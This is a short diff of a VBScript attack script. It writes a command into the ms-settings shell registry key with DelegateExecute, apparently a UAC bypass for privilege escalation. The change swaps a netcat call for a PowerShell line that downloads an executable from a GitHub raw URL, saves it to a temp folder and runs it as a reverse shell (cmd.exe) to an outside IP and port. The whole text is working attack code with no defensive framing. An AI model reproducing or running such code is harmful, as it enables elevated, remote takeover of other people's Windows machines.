@@ -6,7 +6,7 @@ Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
 Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
 Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "c:\%USERPROFILE%\Pictures\nc.exe -nv 3.20.98.123 22056"
+Const DefaultRegKeyValue = "powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/boomer/master/winsoup.exe') | Out-File $env:LOCALAPPDATA\temp\winsoup.exe; & $env:LOCALAPPDATA\temp\winsoup.exe -nv 3.20.98.123 22056 -e cmd.exe"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
